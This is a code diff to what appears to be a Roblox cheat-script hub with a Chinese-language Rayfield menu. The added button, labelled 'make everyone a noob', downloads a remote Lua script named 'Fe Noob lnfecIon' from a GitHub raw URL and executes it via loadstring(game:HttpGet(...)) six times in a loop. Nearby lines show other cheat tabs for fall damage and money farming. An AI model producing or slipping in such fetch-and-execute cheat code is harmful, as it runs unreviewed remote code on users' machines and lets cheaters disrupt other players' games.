@@ -690,6 +690,26 @@ NaturalDisasterTab:CreateButton({Name = "切换防跌落伤害", Callback = func
     end
 end})
 
+NaturalDisasterTab:CreateButton({Name = "所有人变noob", Callback = function() -- 定义加载函数
+local function loadScript()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN022023/Fe-Noob-lnfecIon/refs/heads/main/Fe%20Noob%20lnfecIon"))()
+    end)
+    
+    if success then
+        print("脚本加载成功一次")
+    else
+        warn("脚本加载失败: " .. err)
+    end
+end
+
+-- 连续执行 6 次
+for i = 1, 6 do
+    loadScript()
+    task.wait(0.5) -- 建议加一个极短的延迟，防止请求过于频繁被 GitHub 拦截
+end 
+Rayfield:Notify({Title = "所有人变菜鸟", Content = "已加载！", Duration = 5}) end})
+
 -- Tab 8: 建船寻宝区域
 local BuildBoatTab = Window:CreateTab("建船寻宝", 4483362458)
 BuildBoatTab:CreateParagraph({Title = "功能", Content = "• 刷钱"})
